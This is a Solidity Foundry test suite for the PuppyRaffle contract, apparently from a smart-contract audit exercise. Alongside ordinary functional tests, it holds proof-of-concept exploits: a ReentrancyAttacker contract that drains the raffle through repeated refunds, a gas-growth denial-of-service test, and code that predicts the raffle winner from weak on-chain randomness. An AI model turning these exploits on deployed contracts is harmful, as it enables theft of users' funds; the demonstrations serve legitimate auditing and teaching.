// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function test_denialOfService() public {
        // address[] memory players = new address[](1);
        // players[0] = playerOne;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // assertEq(puppyRaffle.players(0), playerOne);
        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        // See how much gas it cost
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console.log("Gas cost of the first 100 player: ", gasUsedFirst);

        // Let's enter for the 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // See how much gas it cost
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;

        console.log("Gas cost of the second 100 player: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }

    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackerUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance", startingAttackContractBalance);
        console.log("starting contract balance", startingContractBalance);

        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log("ending contract balance", address(puppyRaffle).balance);
    }

    function test_randomNumberVulnerability() public {
        console.log("\n=== Testing Random Number Generation Vulnerability ===");

        // Setup: Create 4 players (minimum required)
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // Fast forward to after raffle duration
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Get players length - we know we entered 4 players
        uint256 playersLength = 4;

        // Record who would win based on current state
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % playersLength;

        address predictedWinner = puppyRaffle.players(winnerIndex);
        console.log("Predicted winner with current state:", predictedWinner);

        // Demonstrate predictability: Same inputs produce same output
        bytes32 hash1 = keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty));
        bytes32 hash2 = keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty));
        assertEq(hash1, hash2);

        // Demonstrate that attackers can manipulate the randomness
        console.log("\n--- Attack Scenario 1: Front-running ---");

        // Attacker sees a pending selectWinner transaction
        // They can calculate if they will win
        address attacker = address(0x1337);

        // Fund and enter attacker
        vm.deal(attacker, entranceFee);
        vm.prank(attacker);

        address[] memory newPlayers = new address[](1);
        newPlayers[0] = attacker;
        puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);

        // Get updated players length - now 5 players (4 original + 1 attacker)
        uint256 newPlayersLength = 5;

        // Recalculate winner with attacker included
        uint256 newWinnerIndex =
            uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % newPlayersLength;

        address newPredictedWinner = puppyRaffle.players(newWinnerIndex);
        console.log("After attacker enters, predicted winner:", newPredictedWinner);
        console.log("Attacker wins?", newPredictedWinner == attacker ? "YES" : "NO");

        console.log("\n--- Attack Scenario 2: Timestamp Manipulation ---");

        // Miners can manipulate block.timestamp within limits
        uint256 originalTimestamp = block.timestamp;
        for (uint256 i = 0; i < 5; i++) {
            vm.warp(originalTimestamp + i * 2); // Miner can adjust timestamp
            uint256 manipulatedIndex =
                uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % newPlayersLength;

            address manipulatedWinner = puppyRaffle.players(manipulatedIndex);
            if (manipulatedWinner == attacker) {
                console.log("Found winning timestamp at +", i * 2, "seconds");
                console.log("Attacker would win at timestamp:", block.timestamp);
            }
        }

        // Reset timestamp
        vm.warp(originalTimestamp);

        console.log("\n--- Attack Scenario 3: Multiple Entry Attack ---");

        // Attacker can increase their odds by entering multiple times
        address attacker2 = address(0x4242);
        uint256 entriesCount = 5;
        address[] memory attackerEntries = new address[](entriesCount);
        for (uint256 i = 0; i < entriesCount; i++) {
            attackerEntries[i] = address(uint160(attacker2) + i);
        }

        vm.deal(attacker2, entranceFee * entriesCount);
        vm.prank(attacker2);
        puppyRaffle.enterRaffle{value: entranceFee * entriesCount}(attackerEntries);

        // Calculate probability of attacker winning
        uint256 totalPlayers = 10; // 4 original + 1 first attacker + 5 second attacker
        uint256 attackerOdds = (entriesCount * 100) / totalPlayers;
        console.log("Attacker entered", entriesCount, "times");
        console.log("Total players:", totalPlayers);
        console.log("Attacker odds (%):", attackerOdds);

        // But with predictable randomness, attacker can do even better
        uint256 winningIndex =
            uint256(keccak256(abi.encodePacked(attacker2, block.timestamp, block.difficulty))) % totalPlayers;

        address winner = puppyRaffle.players(winningIndex);
        bool isAttackerWinner = false;
        for (uint256 i = 0; i < entriesCount; i++) {
            if (winner == address(uint160(attacker2) + i)) {
                isAttackerWinner = true;
                break;
            }
        }

        console.log("With predictable RNG, attacker wins?", isAttackerWinner);

        console.log("\n--- Attack Scenario 4: MEV Bot Exploitation ---");

        // MEV bots can monitor mempool and extract value
        uint256 prizePool = (totalPlayers * entranceFee * 80) / 100;
        console.log("Prize pool available:", prizePool);

        // MEV bot can calculate if it's profitable to front-run
        uint256 gasCost = 500000 * tx.gasprice; // Estimate
        console.log("Estimated gas cost to front-run:", gasCost);
        console.log("Profit if successful:", prizePool > gasCost ? prizePool - gasCost : 0);

        console.log("\n--- Attack Scenario 5: Block Difficulty Manipulation ---");

        // Miners can influence block.difficulty
        uint256 originalDifficulty = block.difficulty;

        for (uint256 i = 0; i < 3; i++) {
            // Simulate different difficulties
            uint256 simulatedDifficulty = originalDifficulty + i * 1000000;
            uint256 manipulatedIndex = uint256(
                keccak256(abi.encodePacked(address(0x9999), block.timestamp, simulatedDifficulty))
            ) % totalPlayers;

            console.log("Difficulty:", simulatedDifficulty, "-> Winner index:", manipulatedIndex);
        }
    }

    // Test specifically for the predictability issue
    function test_randomNumberIsPredictable() public {
        console.log("\n=== Proving Random Number is Predictable ===");

        // Enter 4 players
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);

        // Calculate the "random" winner before calling selectWinner
        // In the actual contract, it uses players.length which would be 4
        uint256 calculatedWinnerIndex =
            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;

        address calculatedWinner = puppyRaffle.players(calculatedWinnerIndex);

        // Actually call selectWinner
        puppyRaffle.selectWinner();
        address actualWinner = puppyRaffle.previousWinner();

        console.log("Calculated winner (before call):", calculatedWinner);
        console.log("Actual winner (after call):", actualWinner);

        // They should match
        assertEq(calculatedWinner, actualWinner);
        console.log("PROVED: Random number was predictable before the transaction!");
    }

    // Test showing how an attacker can guarantee a win by manipulating msg.sender
    function test_attackerCanManipulateMsgSender() public {
        console.log("\n=== Demonstrating msg.sender Manipulation Attack ===");

        // Setup victims
        address[] memory victims = new address[](4);
        victims[0] = playerOne;
        victims[1] = playerTwo;
        victims[2] = playerThree;
        victims[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(victims);

        vm.warp(block.timestamp + duration + 1);

        // The vulnerability: msg.sender is used in the random number generation
        // This means the person calling selectWinner influences the outcome!

        console.log("The contract uses msg.sender to generate the random number");
        console.log("This means the caller can influence who wins!");

        // Different callers will produce different winners
        address[] memory potentialCallers = new address[](5);
        potentialCallers[0] = address(0xAAAA);
        potentialCallers[1] = address(0xBBBB);
        potentialCallers[2] = address(0xCCCC);
        potentialCallers[3] = address(0xDDDD);
        potentialCallers[4] = address(0xEEEE);

        console.log("\nDifferent callers produce different winners:");
        for (uint256 i = 0; i < potentialCallers.length; i++) {
            uint256 winnerIdx =
                uint256(keccak256(abi.encodePacked(potentialCallers[i], block.timestamp, block.difficulty))) % 4;

            address winner = puppyRaffle.players(winnerIdx);
            console.log("Caller", potentialCallers[i], "-> Winner:", winner);

            if (winner == potentialCallers[i]) {
                console.log(" Caller would win! They can call selectWinner themselves");
            }
        }

        console.log("\n Attack vector: A player can call selectWinner themselves");
        console.log("   if they calculate that they will be the winner!");
    }

    // Test showing the exact attack scenario
    function test_completeAttackScenario() public {
        console.log("\n=== Complete Attack Scenario ===");

        // 1. Normal users enter the raffle
        address[] memory victims = new address[](4);
        victims[0] = playerOne;
        victims[1] = playerTwo;
        victims[2] = playerThree;
        victims[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(victims);

        console.log("1. 4 victims entered the raffle");

        // 2. Attacker monitors the mempool and sees the raffle is about to end
        vm.warp(block.timestamp + duration + 1);

        // 3. Attacker calculates if they will win if they call selectWinner
        address attacker = address(0xAAAA);

        uint256 winnerIndexIfAttackerCalls =
            uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;

        address winnerIfAttackerCalls = puppyRaffle.players(winnerIndexIfAttackerCalls);

        console.log("2. Attacker calculates winner if they call selectWinner:", winnerIfAttackerCalls);

        if (winnerIfAttackerCalls == attacker) {
            console.log(" Attacker would win! They can call selectWinner now");

            // But wait - attacker needs to be in the players array to win
            console.log(" But attacker is not in the players array!");
            console.log("   They need to enter first");

            // 5. Attacker enters and calls selectWinner in the same transaction
            vm.deal(attacker, entranceFee);
            vm.startPrank(attacker);

            address[] memory attackerEntry = new address[](1);
            attackerEntry[0] = attacker;
            puppyRaffle.enterRaffle{value: entranceFee}(attackerEntry);

            // Recalculate with attacker in array
            uint256 newWinnerIndex =
                uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 5; // 5 players now

            console.log("3. Attacker enters, new winner index:", newWinnerIndex);

            if (newWinnerIndex == 4) {
                // 4 is the attacker's index (last one)
                console.log(" Attacker will win!");
                puppyRaffle.selectWinner();
                console.log("4. Attacker calls selectWinner and wins!");
                assertEq(puppyRaffle.previousWinner(), attacker);
            }

            vm.stopPrank();
        } else {
            console.log(" Attacker wouldn't win with current timestamp");
            console.log("   Attacker can wait for a different block or front-run");
        }
    }

    // Helper to demonstrate why this is broken
    function test_whyRandomnessIsBroken() public view {
        console.log("\n=== Why On-Chain Randomness is Broken ===");

        console.log("The contract uses:");
        console.log("1. msg.sender - The caller can choose who calls the function");
        console.log("2. block.timestamp - Miners can manipulate this by +/- 15 seconds");
        console.log("3. block.difficulty - Miners can also influence this");

        console.log("\nProblems:");
        console.log("- All inputs are known or controllable");
        console.log("- No source of external entropy");
        console.log("- Results can be predicted before the transaction");
        console.log("- Miners have incentive to manipulate for profit");

        console.log("\nProper solution: Use Chainlink VRF");
        console.log("- Random number is generated off-chain");
        console.log("- Cryptographically verifiable");
        console.log("- Cannot be predicted or manipulated");
    }

    // Test to demonstrate the exact vulnerability from the contract
    function test_exactVulnerability() public {
        console.log("\n=== Demonstrating the Exact Vulnerability ===");

        // The vulnerable line in the contract:
        // uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

        // Show that all these values are predictable:

        // 1. msg.sender - whoever calls the function
        address caller = address(this);
        console.log("msg.sender (caller):", caller);
        console.log(" Caller can choose to call or not call based on predicted outcome");

        // 2. block.timestamp - current block timestamp
        uint256 timestamp = block.timestamp;
        console.log("block.timestamp:", timestamp);
        console.log(" Miners can manipulate this by ~15 seconds");

        // 3. block.difficulty - current block difficulty
        uint256 difficulty = block.difficulty;
        console.log("block.difficulty:", difficulty);
        console.log(" Miners have some control over this");

        // Calculate the "random" number
        bytes32 randomHash = keccak256(abi.encodePacked(caller, timestamp, difficulty));
        uint256 randomNumber = uint256(randomHash);
        console.log("\nRandom hash:", vm.toString(randomHash));
        console.log("Random number:", randomNumber);

        // Demonstrate that if you know these values, you can predict the winner
        console.log("\n VULNERABILITY: Anyone can predict the winner before calling selectWinner()");
        console.log(" This allows front-running, MEV attacks, and miner manipulation");
    }
}

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }
}
